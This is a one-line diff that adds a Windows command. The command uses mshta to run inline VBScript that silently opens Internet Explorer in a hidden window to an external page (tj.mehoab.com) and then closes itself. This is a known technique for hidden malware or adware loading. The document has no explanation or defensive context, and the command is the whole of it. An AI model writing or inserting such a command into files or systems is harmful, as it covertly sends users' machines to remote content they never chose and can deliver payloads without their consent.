@@ -1,0 +1,1 @@
+mshta vbscript:CreateObject("WScript.Shell").Run("iexplore http://tj.mehoab.com/bb/15.htm",0)(window.close) 
